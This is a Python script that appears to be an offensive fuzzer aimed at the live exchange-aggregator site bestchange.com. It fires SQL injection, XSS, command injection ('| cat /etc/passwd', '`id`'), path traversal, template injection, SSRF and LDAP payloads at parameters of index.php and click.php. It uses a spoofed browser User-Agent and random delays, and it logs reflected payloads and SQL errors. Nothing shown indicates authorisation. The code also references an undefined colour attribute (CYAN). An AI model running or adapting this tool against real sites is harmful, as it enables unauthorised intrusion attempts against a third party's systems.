#!/usr/bin/env python3
"""
BestChange.com Aggressive Fuzzer
Intensive fuzzing with comprehensive payload sets
"""

import requests
import time
import random
import itertools
from urllib.parse import quote

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    RESET = '\033[0m'

class AggressiveFuzzer:
    def __init__(self, base_url="https://www.bestchange.com"):
        self.base_url = base_url
        self.session = requests.Session()
        self.findings = []
        self.setup_session()
    
    def setup_session(self):
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        })
        self.session.timeout = 8
    
    def random_delay(self, min_sec=0.05, max_sec=0.2):
        time.sleep(random.uniform(min_sec, max_sec))
    
    def log_finding(self, vuln_type, location, details, severity="MEDIUM"):
        self.findings.append({
            'type': vuln_type,
            'location': location,
            'details': details,
            'severity': severity
        })
        color = Colors.RED if severity == "HIGH" else Colors.YELLOW
        print(f"{color}[!] {vuln_type} [{severity}]{Colors.RESET}")
        print(f"    {location}: {details}\n")
    
    def fuzz_intensive(self):
        """Intensive fuzzing with large payload set"""
        print(f"{Colors.BLUE}[*] Starting intensive fuzzing...{Colors.RESET}")
        
        # Large payload set
        payloads = [
            # SQL Injection
            "' OR '1'='1", "1' UNION SELECT NULL--", "1' AND SLEEP(5)--",
            # XSS
            "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
            # Command Injection
            "; ls", "| cat /etc/passwd", "`id`",
            # Path Traversal
            "../../../etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            # Template Injection
            "{{7*7}}", "${7*7}", "<%=7*7%>",
            # SSRF
            "http://127.0.0.1", "http://localhost",
            # LDAP
            "*", "*)(&", "*))%00",
        ]
        
        params = ['id', 'from', 'to', 'city', 'mt', 'lang', 'file', 'page', 'include']
        endpoints = [
            f'{self.base_url}/index.php',
            f'{self.base_url}/click.php',
        ]
        
        count = 0
        for endpoint in endpoints:
            for param in params:
                for payload in payloads:
                    try:
                        test_params = {param: payload}
                        if endpoint.endswith('click.php'):
                            test_params.update({'id': '1', 'from': '10', 'to': '58', 'city': '0'})
                        
                        response = self.session.get(endpoint, params=test_params, timeout=5)
                        count += 1
                        
                        # Quick analysis
                        if 'error' in response.text.lower() and 'sql' in response.text.lower():
                            self.log_finding("SQL Error", f"{endpoint}?{param}", "SQL error detected", "HIGH")
                        
                        if payload in response.text:
                            self.log_finding("Reflection", f"{endpoint}?{param}", f"Payload reflected", "MEDIUM")
                        
                        if count % 50 == 0:
                            print(f"{Colors.CYAN}[*] Processed {count} requests...{Colors.RESET}")
                        
                        self.random_delay()
                    except:
                        continue
        
        print(f"{Colors.GREEN}[+] Intensive fuzzing completed: {count} requests{Colors.RESET}")

def main():
    print(f"{Colors.BLUE}{'='*70}{Colors.RESET}")
    print(f"{Colors.BLUE}BestChange.com Aggressive Fuzzer{Colors.RESET}")
    print(f"{Colors.BLUE}{'='*70}{Colors.RESET}\n")
    
    fuzzer = AggressiveFuzzer()
    fuzzer.fuzz_intensive()
    
    print(f"\n{Colors.YELLOW}Total findings: {len(fuzzer.findings)}{Colors.RESET}")

if __name__ == "__main__":
    main()
